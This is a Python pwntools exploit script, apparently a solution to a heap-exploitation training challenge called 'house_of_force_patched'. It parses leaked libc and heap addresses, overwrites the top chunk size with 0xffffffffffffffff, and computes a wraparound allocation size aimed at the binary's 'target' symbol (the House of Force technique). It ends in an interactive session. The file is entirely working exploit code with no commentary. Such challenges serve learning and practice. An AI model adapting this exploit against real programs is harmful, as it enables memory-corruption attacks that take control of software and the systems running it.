#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_force_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe

p = process()


def allocate(size, data):
    p.send(b"1") # select 1
    p.sendafter(b"size: ", f"{size}".encode())
    p.sendafter(b"data: ", data)
    p.recvuntil(b"> ") # reach > again for prompt


def edit(index, data):
    p.sendline(b"2")
    p.sendlineafter(b"Enter index:" , index)
    p.sendlineafter(b"data:", data)

def diff(x, y):
    return (0xffffffffffffffff - x) + y

p.recvuntil(b' @ ')
puts_leak = int(p.recvline()[:-1],16)
libc.address = puts_leak - libc.sym.puts

p.recvuntil(b'heap @ ')
heap = int(p.recvline()[:-1],16) + 0x90

log.info(f"libc: {hex(libc.address)}")
log.info(f"heap: {hex(heap)}")
log.success("heap leak!")

p.timeout = 0.1

input()
allocate(24, b"O" * 24 + p64(0xffffffffffffffff)) 
log.success("top chunk set to: 0xffffffffffffffff")

displacement = diff(heap + 0x20, exe.sym.target - 0x20)

p.sendafter(b'> ',b'1')
p.sendafter(b'size: ',str(displacement))
p.sendafter(b'data: ',b'a')



p.interactive()
